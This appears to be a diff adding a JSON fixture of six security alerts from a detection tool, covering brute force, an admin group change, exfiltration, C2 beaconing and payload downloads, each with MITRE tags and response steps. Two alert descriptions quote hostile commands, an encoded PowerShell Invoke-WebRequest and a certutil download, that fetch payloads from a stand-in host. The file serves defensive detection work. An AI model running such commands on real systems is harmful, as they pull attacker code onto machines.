@@ -1,0 +1,230 @@
+[
+  {
+    "alert_id": "301f206cb1ab",
+    "rule_id": "AUTH-001",
+    "title": "Successful login after brute force pattern",
+    "description": "5 failed logins for svc-backup from 203.0.113.45 were observed inside a 10 minute window.",
+    "severity": "critical",
+    "severity_score": 100,
+    "priority": "P1",
+    "mitre_attack": [
+      {
+        "technique_id": "T1110",
+        "name": "Brute Force",
+        "tactic": "Credential Access"
+      },
+      {
+        "technique_id": "T1078",
+        "name": "Valid Accounts",
+        "tactic": "Defense Evasion / Persistence / Privilege Escalation / Initial Access"
+      }
+    ],
+    "iocs": {
+      "ip_addresses": [
+        "10.10.0.10",
+        "203.0.113.45"
+      ],
+      "external_ip_addresses": [
+        "203.0.113.45"
+      ]
+    },
+    "event_count": 6,
+    "first_seen": "2026-06-24T09:00:00+00:00",
+    "last_seen": "2026-06-24T09:06:00+00:00",
+    "recommended_actions": [
+      "Disable or reset the affected account until ownership is verified.",
+      "Review VPN and identity-provider logs for additional source IPs.",
+      "Confirm whether the successful login created new sessions or tokens."
+    ]
+  },
+  {
+    "alert_id": "743db1740ff0",
+    "rule_id": "ID-001",
+    "title": "Privileged group membership change",
+    "description": "temp-admin modified privileged access on DC-01: temp-admin added mlee to Domain Admins",
+    "severity": "critical",
+    "severity_score": 90,
+    "priority": "P1",
+    "mitre_attack": [
+      {
+        "technique_id": "T1098",
+        "name": "Account Manipulation",
+        "tactic": "Persistence / Privilege Escalation"
+      }
+    ],
+    "iocs": {
+      "ip_addresses": [
+        "10.30.2.10",
+        "10.30.2.5"
+      ]
+    },
+    "event_count": 1,
+    "first_seen": "2026-06-24T09:18:00+00:00",
+    "last_seen": "2026-06-24T09:18:00+00:00",
+    "recommended_actions": [
+      "Validate the change ticket and business owner.",
+      "Remove unauthorized group membership immediately.",
+      "Review recent activity for both the admin actor and the newly privileged user."
+    ]
+  },
+  {
+    "alert_id": "d4729dcbcd4f",
+    "rule_id": "NET-002",
+    "title": "Large outbound data transfer",
+    "description": "HR-FILE-02 sent 73,400,320 bytes to file-dropbox-sync.test.",
+    "severity": "high",
+    "severity_score": 85,
+    "priority": "P2",
+    "mitre_attack": [
+      {
+        "technique_id": "T1041",
+        "name": "Exfiltration Over C2 Channel",
+        "tactic": "Exfiltration"
+      },
+      {
+        "technique_id": "T1071",
+        "name": "Application Layer Protocol",
+        "tactic": "Command and Control"
+      }
+    ],
+    "iocs": {
+      "ip_addresses": [
+        "10.50.3.44",
+        "203.0.113.200"
+      ],
+      "domains": [
+        "file-dropbox-sync.test"
+      ],
+      "external_ip_addresses": [
+        "203.0.113.200"
+      ]
+    },
+    "event_count": 1,
+    "first_seen": "2026-06-24T10:05:00+00:00",
+    "last_seen": "2026-06-24T10:05:00+00:00",
+    "recommended_actions": [
+      "Confirm whether the transfer was approved business activity.",
+      "Review file access logs for sensitive data touched before upload.",
+      "Preserve proxy logs and destination metadata for escalation."
+    ]
+  },
+  {
+    "alert_id": "0c91e165b156",
+    "rule_id": "PROC-001",
+    "title": "Encoded PowerShell download activity",
+    "description": "FIN-WS-07 ran powershell.exe: powershell.exe -NoProfile -WindowStyle Hidden -enc SQBFAFgA; Invoke-WebRequest http://malicious-update.test/a.ps1 -OutFile C:\\ProgramData\\a.ps1",
+    "severity": "high",
+    "severity_score": 80,
+    "priority": "P2",
+    "mitre_attack": [
+      {
+        "technique_id": "T1059",
+        "name": "Command and Scripting Interpreter",
+        "tactic": "Execution"
+      },
+      {
+        "technique_id": "T1105",
+        "name": "Ingress Tool Transfer",
+        "tactic": "Command and Control"
+      }
+    ],
+    "iocs": {
+      "ip_addresses": [
+        "10.20.5.17",
+        "203.0.113.91"
+      ],
+      "domains": [
+        "malicious-update.test"
+      ],
+      "hashes": [
+        "9f2c1a7b3e4d5c6f88990011aabbccddeeff00112233445566778899aabbccdd"
+      ],
+      "external_ip_addresses": [
+        "203.0.113.91"
+      ]
+    },
+    "event_count": 1,
+    "first_seen": "2026-06-24T09:10:00+00:00",
+    "last_seen": "2026-06-24T09:10:00+00:00",
+    "recommended_actions": [
+      "Isolate the endpoint if the command was not approved change activity.",
+      "Acquire process tree, command history, and related file hashes.",
+      "Search endpoint telemetry for the same command line or hash."
+    ]
+  },
+  {
+    "alert_id": "798e18cfc18e",
+    "rule_id": "PROC-001",
+    "title": "Certutil payload transfer activity",
+    "description": "FIN-WS-07 ran certutil.exe: certutil.exe -urlcache -split -f http://malicious-update.test/payload.exe C:\\ProgramData\\payload.exe",
+    "severity": "high",
+    "severity_score": 80,
+    "priority": "P2",
+    "mitre_attack": [
+      {
+        "technique_id": "T1105",
+        "name": "Ingress Tool Transfer",
+        "tactic": "Command and Control"
+      }
+    ],
+    "iocs": {
+      "ip_addresses": [
+        "10.20.5.17",
+        "203.0.113.91"
+      ],
+      "domains": [
+        "malicious-update.test"
+      ],
+      "hashes": [
+        "3b5d5c3712955042212316173ccf37be800f7c213ac82c13ec57d801aa34526f"
+      ],
+      "external_ip_addresses": [
+        "203.0.113.91"
+      ]
+    },
+    "event_count": 1,
+    "first_seen": "2026-06-24T09:12:00+00:00",
+    "last_seen": "2026-06-24T09:12:00+00:00",
+    "recommended_actions": [
+      "Isolate the endpoint if the command was not approved change activity.",
+      "Acquire process tree, command history, and related file hashes.",
+      "Search endpoint telemetry for the same command line or hash."
+    ]
+  },
+  {
+    "alert_id": "96dd654b7a31",
+    "rule_id": "NET-001",
+    "title": "Periodic outbound beaconing pattern",
+    "description": "DEV-LAPTOP-22 contacted c2-checkin.evil-example.test 5 times over 20 minutes.",
+    "severity": "high",
+    "severity_score": 80,
+    "priority": "P2",
+    "mitre_attack": [
+      {
+        "technique_id": "T1071",
+        "name": "Application Layer Protocol",
+        "tactic": "Command and Control"
+      }
+    ],
+    "iocs": {
+      "ip_addresses": [
+        "10.40.8.22",
+        "198.51.100.77"
+      ],
+      "domains": [
+        "c2-checkin.evil-example.test"
+      ],
+      "external_ip_addresses": [
+        "198.51.100.77"
+      ]
+    },
+    "event_count": 5,
+    "first_seen": "2026-06-24T09:25:00+00:00",
+    "last_seen": "2026-06-24T09:45:00+00:00",
+    "recommended_actions": [
+      "Block the destination at egress controls while investigation continues.",
+      "Review DNS, proxy, and endpoint telemetry for related callbacks.",
+      "Check the host for persistence mechanisms and recently spawned processes."
+    ]
+  }
+]
